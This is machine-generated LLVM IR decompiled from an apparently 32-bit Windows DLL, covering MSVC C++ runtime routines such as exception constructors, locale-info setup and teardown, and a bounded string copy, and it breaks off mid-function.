@vtable_1002d41c = local_unnamed_addr global %vtable_1002d41c_type { i32 (i32)* @"??_G?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z" }
@vtable_1002d424 = local_unnamed_addr global %vtable_1002d424_type { i32 (i32)* @function_1000d48b }
@vtable_1002d478 = local_unnamed_addr global %vtable_1002d478_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001270 }
@vtable_1002d494 = local_unnamed_addr global %vtable_1002d494_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001270 }
@vtable_1002d4ac = local_unnamed_addr global %vtable_1002d4ac_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001270 }
@global_var_1002dfbc = constant %vtable_1002dfbc_type { i32 (i8)* @function_100052d0, i32 ()* @function_10001570, i32 ()* @function_10001580, i32 (i32, i32, i32, i32, i32, i32)* @function_10004780, i32 (i32, i32, i32, i32, i32, i64)* @function_100047f0, i32 (i32, i32, i32, i32, i32, i64)* @function_100049c0, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004b90, i32 (i32, i32, i32, i32, i32, i32, i32)* @function_10004c10, i32 (i32, i32, i32, i32, i32, i32)* @function_10004c90, i32 (i32, i32, i32, i32, i32, i32)* @function_10004d10, i32 (i32, i32, i32, i32, i8, i8)* @function_10004d90 }
@global_var_1002dfec = constant %vtable_1002dfec_type { i32 (i8)* @function_100062f0, i32 ()* @function_10001570, i32 ()* @function_10001580, i32 ()* @function_10005400, i32 ()* @function_100053f0, i32 (i32)* @function_100053a0, i32 (i32)* @function_10005350, i32 (i32)* @function_10005300 }
@vtable_10030550 = local_unnamed_addr global %vtable_10030550_type { i32 (i32)* @"??_G_Ref_count_base@std@@UAEPAXI@Z" }
@vtable_1003055c = local_unnamed_addr global %vtable_1003055c_type { i32 (i32)* @"??_G__non_rtti_object@std@@UAEPAXI@Z", i32 ()* @function_10001270 }

define i32 @function_10001000() local_unnamed_addr {
dec_label_pc_10001000:
  %0 = call i32 @function_10006ff0(), !insn.addr !0
  store i32 0, i32* @global_var_10040a28, align 4, !insn.addr !1
  store i32 15, i32* @global_var_10040a2c, align 4, !insn.addr !2
  store i8 0, i8* bitcast (i32* @global_var_10040a18 to i8*), align 4, !insn.addr !3
  %1 = call i32 @_atexit(void ()* inttoptr (i32 268618880 to void ()*)), !insn.addr !4
  ret i32 %1, !insn.addr !5
}

define i32 @function_100010a0() local_unnamed_addr {
dec_label_pc_100010a0:
  %0 = call i32 @"??0_Init_cout@std@@QAE@XZ"(), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i32 @function_100010c0(void ()* %func) local_unnamed_addr {
dec_label_pc_100010c0:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !7
  ret i32 %0, !insn.addr !8
}

define i32 @function_100010cc(void ()* %func) local_unnamed_addr {
dec_label_pc_100010cc:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !9
  ret i32 %0, !insn.addr !10
}

define i32 @function_100010d8(void ()* %func) local_unnamed_addr {
dec_label_pc_100010d8:
  %0 = call i32 @_atexit(void ()* %func), !insn.addr !11
  ret i32 %0, !insn.addr !12
}

define i32 @function_10001100() local_unnamed_addr {
dec_label_pc_10001100:
  ret i32 ptrtoint (i32* @global_var_10040a30 to i32), !insn.addr !13
}

define i32 @function_10001110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10001110:
  %0 = call i32 @function_10001100(), !insn.addr !14
  %1 = add i32 %0, 4, !insn.addr !15
  %2 = inttoptr i32 %1 to i32*, !insn.addr !15
  %3 = load i32, i32* %2, align 4, !insn.addr !15
  %4 = inttoptr i32 %0 to i32*, !insn.addr !16
  %5 = load i32, i32* %4, align 4, !insn.addr !16
  %6 = call i32 @___stdio_common_vsprintf_s(i32 %5, i32 %3), !insn.addr !17
  %7 = icmp sgt i32 %6, -1, !insn.addr !18
  %8 = select i1 %7, i32 %6, i32 -1, !insn.addr !19
  ret i32 %8, !insn.addr !20
}

define i32 @function_10001150(i32* %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001150:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = ptrtoint i32* %arg1 to i32
  %stack_var_16 = alloca i32, align 4
  %3 = ptrtoint i8* %arg3 to i32, !insn.addr !21
  %4 = call i32 @function_10001110(i32 %2, i32 %arg2, i32 %3, i32 0, i32* nonnull %stack_var_16, i32 %1, i32 %0), !insn.addr !21
  ret i32 %4, !insn.addr !22
}

define i32 @function_10001170(i32* %arg1) local_unnamed_addr {
dec_label_pc_10001170:
  %edi.1.reg2mem = alloca i32, !insn.addr !23
  %edi.0.reg2mem = alloca i32, !insn.addr !23
  %eax.3.reg2mem = alloca i32, !insn.addr !23
  %eax.2.reg2mem = alloca i32, !insn.addr !23
  %edx.2.reg2mem = alloca i32, !insn.addr !23
  %ecx.0.reg2mem = alloca i32, !insn.addr !23
  %eax.1.reg2mem = alloca i32, !insn.addr !23
  %edx.1.reg2mem = alloca i32, !insn.addr !23
  %edx.0.reg2mem = alloca i32, !insn.addr !23
  %eax.0.reg2mem = alloca i32, !insn.addr !23
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = ptrtoint i32* %arg1 to i32
  store i32 2147483647, i32* %edx.0.reg2mem, !insn.addr !24
  br label %dec_label_pc_10001180, !insn.addr !24

dec_label_pc_10001180:                            ; preds = %dec_label_pc_10001185, %dec_label_pc_10001170
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %2 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !25
  %3 = load i8, i8* %2, align 1, !insn.addr !25
  %4 = icmp eq i8 %3, 0, !insn.addr !25
  store i32 %edx.0.reload, i32* %edx.1.reg2mem, !insn.addr !26
  br i1 %4, label %dec_label_pc_1000118b, label %dec_label_pc_10001185, !insn.addr !26

dec_label_pc_10001185:                            ; preds = %dec_label_pc_10001180
  %5 = add i32 %eax.0.reload, 1, !insn.addr !27
  %6 = add i32 %edx.0.reload, -1, !insn.addr !28
  %7 = icmp eq i32 %6, 0, !insn.addr !28
  %8 = icmp eq i1 %7, false, !insn.addr !29
  store i32 %5, i32* %eax.0.reg2mem, !insn.addr !29
  store i32 %6, i32* %edx.0.reg2mem, !insn.addr !29
  store i32 %6, i32* %edx.1.reg2mem, !insn.addr !29
  br i1 %8, label %dec_label_pc_10001180, label %dec_label_pc_1000118b, !insn.addr !29

dec_label_pc_1000118b:                            ; preds = %dec_label_pc_10001185, %dec_label_pc_10001180
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %9 = icmp eq i32 %edx.1.reload, 0, !insn.addr !30
  %10 = icmp eq i1 %9, false, !insn.addr !31
  store i32 -2147024809, i32* %edi.1.reg2mem, !insn.addr !32
  br i1 %10, label %dec_label_pc_100011ab, label %dec_label_pc_100011f3, !insn.addr !32

dec_label_pc_100011ab:                            ; preds = %dec_label_pc_1000118b
  %11 = sub i32 2147483647, %edx.1.reload, !insn.addr !33
  %12 = select i1 %10, i32 %11, i32 0, !insn.addr !34
  %13 = add i32 %12, %0, !insn.addr !35
  %14 = sub i32 2147483647, %12, !insn.addr !36
  %15 = icmp eq i32 %14, 0, !insn.addr !36
  store i32 %13, i32* %eax.2.reg2mem, !insn.addr !37
  br i1 %15, label %dec_label_pc_100011ea, label %dec_label_pc_100011b7, !insn.addr !37

dec_label_pc_100011b7:                            ; preds = %dec_label_pc_100011ab
  %16 = sub i32 %1, %13, !insn.addr !38
  store i32 %13, i32* %eax.1.reg2mem, !insn.addr !38
  store i32 %14, i32* %ecx.0.reg2mem, !insn.addr !38
  store i32 2147483646, i32* %edx.2.reg2mem, !insn.addr !38
  br label %dec_label_pc_100011c1, !insn.addr !38

dec_label_pc_100011c1:                            ; preds = %dec_label_pc_100011cc, %dec_label_pc_100011b7
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %17 = icmp eq i32 %edx.2.reload, 0, !insn.addr !39
  br i1 %17, label %dec_label_pc_100011e6, label %dec_label_pc_100011c5, !insn.addr !40

dec_label_pc_100011c5:                            ; preds = %dec_label_pc_100011c1
  %18 = add i32 %16, %eax.1.reload, !insn.addr !41
  %19 = inttoptr i32 %18 to i8*, !insn.addr !41
  %20 = load i8, i8* %19, align 1, !insn.addr !41
  %21 = icmp eq i8 %20, 0, !insn.addr !42
  br i1 %21, label %dec_label_pc_100011e6, label %dec_label_pc_100011cc, !insn.addr !43

dec_label_pc_100011cc:                            ; preds = %dec_label_pc_100011c5
  %22 = inttoptr i32 %eax.1.reload to i8*
  store i8 %20, i8* %22, align 1, !insn.addr !44
  %23 = add nsw i32 %edx.2.reload, -1, !insn.addr !45
  %24 = add i32 %eax.1.reload, 1, !insn.addr !46
  %25 = add i32 %ecx.0.reload, -1, !insn.addr !47
  %26 = icmp eq i32 %25, 0, !insn.addr !47
  %27 = icmp eq i1 %26, false, !insn.addr !48
  store i32 %24, i32* %eax.1.reg2mem, !insn.addr !48
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !48
  store i32 %23, i32* %edx.2.reg2mem, !insn.addr !48
  br i1 %27, label %dec_label_pc_100011c1, label %dec_label_pc_100011d5, !insn.addr !48

dec_label_pc_100011d5:                            ; preds = %dec_label_pc_100011cc
  %28 = trunc i32 %25 to i8, !insn.addr !49
  store i8 %28, i8* %22, align 1, !insn.addr !49
  ret i32 -2147024774, !insn.addr !50

dec_label_pc_100011e6:                            ; preds = %dec_label_pc_100011c5, %dec_label_pc_100011c1
  %29 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !51
  %30 = icmp eq i1 %29, false, !insn.addr !52
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !52
  store i32 %eax.1.reload, i32* %eax.3.reg2mem, !insn.addr !52
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !52
  br i1 %30, label %dec_label_pc_100011f0, label %dec_label_pc_100011ea, !insn.addr !52

dec_label_pc_100011ea:                            ; preds = %dec_label_pc_100011e6, %dec_label_pc_100011ab
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %31 = add i32 %eax.2.reload, -1, !insn.addr !53
  store i32 %31, i32* %eax.3.reg2mem, !insn.addr !54
  store i32 -2147024774, i32* %edi.0.reg2mem, !insn.addr !54
  br label %dec_label_pc_100011f0, !insn.addr !54

dec_label_pc_100011f0:                            ; preds = %dec_label_pc_100011ea, %dec_label_pc_100011e6
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %eax.3.reload = load i32, i32* %eax.3.reg2mem
  %32 = inttoptr i32 %eax.3.reload to i8*, !insn.addr !55
  store i8 0, i8* %32, align 1, !insn.addr !55
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !55
  br label %dec_label_pc_100011f3, !insn.addr !55

dec_label_pc_100011f3:                            ; preds = %dec_label_pc_1000118b, %dec_label_pc_100011f0
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  ret i32 %edi.1.reload, !insn.addr !56
}

define i32 @"??0exception@std@@QAE@QBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001200:
  %0 = call i128 @__decompiler_undefined_function_3()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !57
  %3 = add i32 %1, 4, !insn.addr !58
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %result, align 4, !insn.addr !59
  %4 = inttoptr i32 %3 to i64*, !insn.addr !60
  %5 = load i64, i64* %4, align 4, !insn.addr !60
  call void @__asm_movq.31(i64 %5, i128 %2), !insn.addr !60
  %6 = call i32 @___std_exception_copy(), !insn.addr !61
  ret i32 %1, !insn.addr !62
}

define i32 @"??0exception@std@@QAE@ABV01@@Z"(i32* %result, i32* %arg2) local_unnamed_addr {
dec_label_pc_10001240:
  %0 = call i128 @__decompiler_undefined_function_3()
  %1 = ptrtoint i32* %result to i32
  %2 = call i128 @__asm_xorps(i128 %0, i128 %0), !insn.addr !63
  %3 = add i32 %1, 4, !insn.addr !64
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %result, align 4, !insn.addr !65
  %4 = inttoptr i32 %3 to i64*, !insn.addr !66
  %5 = load i64, i64* %4, align 4, !insn.addr !66
  call void @__asm_movq.31(i64 %5, i128 %2), !insn.addr !66
  %6 = call i32 @___std_exception_copy(), !insn.addr !67
  ret i32 %1, !insn.addr !68
}

define i32 @function_10001270() {
dec_label_pc_10001270:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !69
  %2 = inttoptr i32 %1 to i32*, !insn.addr !69
  %3 = load i32, i32* %2, align 4, !insn.addr !69
  %4 = icmp eq i32 %3, 0, !insn.addr !70
  %5 = icmp eq i1 %4, false, !insn.addr !71
  %6 = select i1 %5, i32 %3, i32 ptrtoint ([18 x i8]* @global_var_10039158 to i32), !insn.addr !71
  ret i32 %6, !insn.addr !72
}

define i32 @function_10001280(i8 %arg1) {
dec_label_pc_10001280:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !73
  %4 = inttoptr i32 %2 to i32*, !insn.addr !74
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !74
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !75
  %6 = and i8 %arg1, 1, !insn.addr !76
  %7 = icmp eq i8 %6, 0, !insn.addr !76
  br i1 %7, label %dec_label_pc_100012a9, label %dec_label_pc_1000129e, !insn.addr !77

dec_label_pc_1000129e:                            ; preds = %dec_label_pc_10001280
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 12), !insn.addr !78
  br label %dec_label_pc_100012a9, !insn.addr !79

dec_label_pc_100012a9:                            ; preds = %dec_label_pc_1000129e, %dec_label_pc_10001280
  ret i32 %2, !insn.addr !80
}

define i32 @function_100012b0(i8* %arg1) local_unnamed_addr {
dec_label_pc_100012b0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !81
  %3 = add i32 %0, 4, !insn.addr !82
  %4 = inttoptr i32 %0 to i32*, !insn.addr !83
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !83
  %5 = inttoptr i32 %3 to i64*, !insn.addr !84
  %6 = load i64, i64* %5, align 4, !insn.addr !84
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !84
  %7 = call i32 @___std_exception_copy(), !insn.addr !85
  store i32 ptrtoint (i32* @global_var_1002d2e0 to i32), i32* %4, align 4, !insn.addr !86
  ret i32 %0, !insn.addr !87
}

define i32 @"??0bad_cast@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001310:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !88
  %3 = add i32 %0, 4, !insn.addr !89
  %4 = inttoptr i32 %3 to i64*, !insn.addr !89
  %5 = load i64, i64* %4, align 4, !insn.addr !89
  call void @__asm_movq.31(i64 %5, i128 %2), !insn.addr !89
  %6 = inttoptr i32 %3 to i32*, !insn.addr !90
  store i32 ptrtoint ([9 x i8]* @global_var_1003916c to i32), i32* %6, align 4, !insn.addr !90
  %7 = inttoptr i32 %0 to i32*, !insn.addr !91
  store i32 ptrtoint (%vtable_1002d2ec_type* @global_var_1002d2ec to i32), i32* %7, align 4, !insn.addr !91
  ret i32 %0, !insn.addr !92
}

define i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* %result, i8* %arg2) local_unnamed_addr {
dec_label_pc_10001330:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !93
  %eax.0.reg2mem = alloca i32, !insn.addr !93
  %0 = ptrtoint i8* %arg2 to i32
  %1 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !94
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !95
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !96
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !97
  store i32 0, i32* %stack_var_-44, align 4, !insn.addr !98
  %4 = call i32 @"??0_Lockit@std@@QAE@H@Z"(i32 %1), !insn.addr !99
  %5 = add i32 %1, 4, !insn.addr !100
  %6 = inttoptr i32 %5 to i32*, !insn.addr !100
  store i32 0, i32* %6, align 4, !insn.addr !100
  %7 = add i32 %1, 8, !insn.addr !101
  %8 = inttoptr i32 %7 to i8*, !insn.addr !101
  store i8 0, i8* %8, align 1, !insn.addr !101
  %9 = add i32 %1, 12, !insn.addr !102
  %10 = inttoptr i32 %9 to i32*, !insn.addr !102
  store i32 0, i32* %10, align 4, !insn.addr !102
  %11 = add i32 %1, 16, !insn.addr !103
  %12 = inttoptr i32 %11 to i8*, !insn.addr !103
  store i8 0, i8* %12, align 1, !insn.addr !103
  %13 = add i32 %1, 20, !insn.addr !104
  %14 = inttoptr i32 %13 to i32*, !insn.addr !104
  store i32 0, i32* %14, align 4, !insn.addr !104
  %15 = add i32 %1, 24, !insn.addr !105
  %16 = inttoptr i32 %15 to i16*, !insn.addr !105
  store i16 0, i16* %16, align 2, !insn.addr !105
  %17 = add i32 %1, 28, !insn.addr !106
  %18 = inttoptr i32 %17 to i32*, !insn.addr !106
  store i32 0, i32* %18, align 4, !insn.addr !106
  %19 = add i32 %1, 32, !insn.addr !107
  %20 = inttoptr i32 %19 to i16*, !insn.addr !107
  store i16 0, i16* %20, align 2, !insn.addr !107
  %21 = add i32 %1, 36, !insn.addr !108
  %22 = inttoptr i32 %21 to i32*, !insn.addr !108
  store i32 0, i32* %22, align 4, !insn.addr !108
  %23 = add i32 %1, 40, !insn.addr !109
  %24 = inttoptr i32 %23 to i8*, !insn.addr !109
  store i8 0, i8* %24, align 1, !insn.addr !109
  %25 = add i32 %1, 44, !insn.addr !110
  %26 = inttoptr i32 %25 to i32*, !insn.addr !110
  store i32 0, i32* %26, align 4, !insn.addr !110
  %27 = add i32 %1, 48, !insn.addr !111
  %28 = inttoptr i32 %27 to i8*, !insn.addr !111
  store i8 0, i8* %28, align 1, !insn.addr !111
  %29 = icmp eq i8* %arg2, null, !insn.addr !112
  %30 = icmp eq i1 %29, false, !insn.addr !113
  store i32 %0, i32* %eax.0.reg2mem, !insn.addr !113
  store i32* %stack_var_-44, i32** %esp.0.in.reg2mem, !insn.addr !113
  br i1 %30, label %dec_label_pc_100013c5, label %dec_label_pc_100013aa, !insn.addr !113

dec_label_pc_100013aa:                            ; preds = %dec_label_pc_10001330
  %31 = call i32 @function_100012b0(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_10039178, i32 0, i32 0)), !insn.addr !114
  %32 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !115
  store i32 %32, i32* %stack_var_-56, align 4, !insn.addr !115
  %33 = call i32 @"__CxxThrowException@8"(), !insn.addr !116
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !116
  store i32* %stack_var_-56, i32** %esp.0.in.reg2mem, !insn.addr !116
  br label %dec_label_pc_100013c5, !insn.addr !116

dec_label_pc_100013c5:                            ; preds = %dec_label_pc_100013aa, %dec_label_pc_10001330
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %34 = add i32 %esp.0, -4, !insn.addr !117
  %35 = inttoptr i32 %34 to i32*, !insn.addr !117
  store i32 %eax.0.reload, i32* %35, align 4, !insn.addr !117
  %36 = add i32 %esp.0, -8, !insn.addr !118
  %37 = inttoptr i32 %36 to i32*, !insn.addr !118
  store i32 %1, i32* %37, align 4, !insn.addr !118
  %38 = call i32 @"?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z"(i32* nonnull @1, i8* bitcast (i32* @1 to i8*)), !insn.addr !119
  %39 = load i32, i32* %stack_var_-16, align 4, !insn.addr !120
  call void @__writefsdword(i32 0, i32 %39), !insn.addr !121
  ret i32 %1, !insn.addr !122
}

define i32 @"??1_Locinfo@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_100013f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !123
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !124
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !125
  %3 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !126
  %4 = xor i32 %3, %1, !insn.addr !127
  store i32 %4, i32* %stack_var_-24, align 4, !insn.addr !128
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !129
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !130
  %6 = inttoptr i32 %0 to i32*, !insn.addr !131
  %7 = call i32 @"?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z"(i32* %6), !insn.addr !131
  %8 = add i32 %0, 44, !insn.addr !132
  %9 = inttoptr i32 %8 to i32*, !insn.addr !132
  %10 = load i32, i32* %9, align 4, !insn.addr !132
  %11 = icmp eq i32 %10, 0, !insn.addr !133
  br i1 %11, label %dec_label_pc_1000142e, label %dec_label_pc_10001425, !insn.addr !134

dec_label_pc_10001425:                            ; preds = %dec_label_pc_100013f0
  %12 = inttoptr i32 %10 to i32*, !insn.addr !135
  call void @_free(i32* %12), !insn.addr !135
  br label %dec_label_pc_1000142e, !insn.addr !136

dec_label_pc_1000142e:                            ; preds = %dec_label_pc_10001425, %dec_label_pc_100013f0
  store i32 0, i32* %9, align 4, !insn.addr !137
  %13 = add i32 %0, 36, !insn.addr !138
  %14 = inttoptr i32 %13 to i32*, !insn.addr !138
  %15 = load i32, i32* %14, align 4, !insn.addr !138
  %16 = icmp eq i32 %15, 0, !insn.addr !139
  br i1 %16, label %dec_label_pc_10001445, label %dec_label_pc_1000143c, !insn.addr !140

dec_label_pc_1000143c:                            ; preds = %dec_label_pc_1000142e
  %17 = inttoptr i32 %15 to i32*, !insn.addr !141
  call void @_free(i32* %17), !insn.addr !141
  br label %dec_label_pc_10001445, !insn.addr !142

dec_label_pc_10001445:                            ; preds = %dec_label_pc_1000143c, %dec_label_pc_1000142e
  store i32 0, i32* %14, align 4, !insn.addr !143
  %18 = add i32 %0, 28, !insn.addr !144
  %19 = inttoptr i32 %18 to i32*, !insn.addr !144
  %20 = load i32, i32* %19, align 4, !insn.addr !144
  %21 = icmp eq i32 %20, 0, !insn.addr !145
  br i1 %21, label %dec_label_pc_1000145c, label %dec_label_pc_10001453, !insn.addr !146

dec_label_pc_10001453:                            ; preds = %dec_label_pc_10001445
  %22 = inttoptr i32 %20 to i32*, !insn.addr !147
  call void @_free(i32* %22), !insn.addr !147
  br label %dec_label_pc_1000145c, !insn.addr !148

dec_label_pc_1000145c:                            ; preds = %dec_label_pc_10001453, %dec_label_pc_10001445
  %23 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !149
  store i32 0, i32* %19, align 4, !insn.addr !150
  %24 = add i32 %0, 20, !insn.addr !151
  %25 = inttoptr i32 %24 to i32*, !insn.addr !151
  %26 = load i32, i32* %25, align 4, !insn.addr !151
  %27 = icmp eq i32 %26, 0, !insn.addr !152
  br i1 %27, label %dec_label_pc_10001473, label %dec_label_pc_1000146a, !insn.addr !153

dec_label_pc_1000146a:                            ; preds = %dec_label_pc_1000145c
  %28 = add i32 %23, -4, !insn.addr !154
  %29 = inttoptr i32 %28 to i32*, !insn.addr !154
  store i32 %26, i32* %29, align 4, !insn.addr !154
  call void @_free(i32* nonnull @1), !insn.addr !155
  br label %dec_label_pc_10001473, !insn.addr !156

dec_label_pc_10001473:                            ; preds = %dec_label_pc_1000146a, %dec_label_pc_1000145c
  store i32 0, i32* %25, align 4, !insn.addr !157
  %30 = add i32 %0, 12, !insn.addr !158
  %31 = inttoptr i32 %30 to i32*, !insn.addr !158
  %32 = load i32, i32* %31, align 4, !insn.addr !158
  %33 = icmp eq i32 %32, 0, !insn.addr !159
  br i1 %33, label %dec_label_pc_1000148a, label %dec_label_pc_10001481, !insn.addr !160

dec_label_pc_10001481:                            ; preds = %dec_label_pc_10001473
  %34 = add i32 %23, -4, !insn.addr !161
  %35 = inttoptr i32 %34 to i32*, !insn.addr !161
  store i32 %32, i32* %35, align 4, !insn.addr !161
  call void @_free(i32* nonnull @1), !insn.addr !162
  br label %dec_label_pc_1000148a, !insn.addr !163

dec_label_pc_1000148a:                            ; preds = %dec_label_pc_10001481, %dec_label_pc_10001473
  store i32 0, i32* %31, align 4, !insn.addr !164
  %36 = add i32 %0, 4, !insn.addr !165
  %37 = inttoptr i32 %36 to i32*, !insn.addr !165
  %38 = load i32, i32* %37, align 4, !insn.addr !165
  %39 = icmp eq i32 %38, 0, !insn.addr !166
  br i1 %39, label %dec_label_pc_100014a1, label %dec_label_pc_10001498, !insn.addr !167

dec_label_pc_10001498:                            ; preds = %dec_label_pc_1000148a
  %40 = add i32 %23, -4, !insn.addr !168
  %41 = inttoptr i32 %40 to i32*, !insn.addr !168
  store i32 %38, i32* %41, align 4, !insn.addr !168
  call void @_free(i32* nonnull @1), !insn.addr !169
  br label %dec_label_pc_100014a1, !insn.addr !170

dec_label_pc_100014a1:                            ; preds = %dec_label_pc_10001498, %dec_label_pc_1000148a
  store i32 0, i32* %37, align 4, !insn.addr !171
  %42 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !172
  %43 = load i32, i32* %stack_var_-16, align 4, !insn.addr !173
  call void @__writefsdword(i32 0, i32 %43), !insn.addr !174
  ret i32 %42, !insn.addr !175
}

define i32 @function_100014c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100014c0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !176
  %3 = add i32 %0, 4, !insn.addr !177
  %4 = inttoptr i32 %0 to i32*, !insn.addr !178
  store i32 ptrtoint (%vtable_1002d2d4_type* @global_var_1002d2d4 to i32), i32* %4, align 4, !insn.addr !178
  %5 = inttoptr i32 %3 to i64*, !insn.addr !179
  %6 = load i64, i64* %5, align 4, !insn.addr !179
  call void @__asm_movq.31(i64 %6, i128 %2), !insn.addr !179
  %7 = call i32 @___std_exception_copy(), !insn.addr !180
  store i32 ptrtoint (i32* @global_var_1002d2e0 to i32), i32* %4, align 4, !insn.addr !181
  ret i32 %0, !insn.addr !182
}

define i32 @function_10001500(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001500:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !183
  %2 = icmp eq i8 %1, 0, !insn.addr !183
  %3 = inttoptr i32 %0 to i32*, !insn.addr !184
  store i32 ptrtoint (i32* @global_var_1002d2f8 to i32), i32* %3, align 4, !insn.addr !184
  br i1 %2, label %dec_label_pc_1000151d, label %dec_label_pc_10001512, !insn.addr !185

dec_label_pc_10001512:                            ; preds = %dec_label_pc_10001500
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 4), !insn.addr !186
  br label %dec_label_pc_1000151d, !insn.addr !187

dec_label_pc_1000151d:                            ; preds = %dec_label_pc_10001512, %dec_label_pc_10001500
  ret i32 %0, !insn.addr !188
}

define i32 @function_10001570() {
dec_label_pc_10001570:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 4, !insn.addr !189
  %3 = inttoptr i32 %2 to i32*, !insn.addr !189
  %4 = load i32, i32* %3, align 4, !insn.addr !189
  %5 = add i32 %4, 1, !insn.addr !189
  store i32 %5, i32* %3, align 4, !insn.addr !189
  ret i32 %1, !insn.addr !190
}

define i32 @function_10001580() {
dec_label_pc_10001580:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !191
  %2 = inttoptr i32 %1 to i32*, !insn.addr !191
  %3 = load i32, i32* %2, align 4, !insn.addr !191
  %4 = add i32 %3, -1, !insn.addr !191
  %5 = icmp eq i32 %4, 0, !insn.addr !191
  store i32 %4, i32* %2, align 4, !insn.addr !191
  %6 = select i1 %5, i32 %0, i32 0, !insn.addr !192
  ret i32 %6, !insn.addr !193
}

define i32 @function_100015a0() local_unnamed_addr {
dec_label_pc_100015a0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = inttoptr i32 %0 to i32*, !insn.addr !194
  store i32 ptrtoint (i32* @global_var_1002d2f8 to i32), i32* %2, align 4, !insn.addr !194
  ret i32 %1, !insn.addr !195
}

define i32 @"??1locale@std@@QAE@XZ"() local_unnamed_addr {
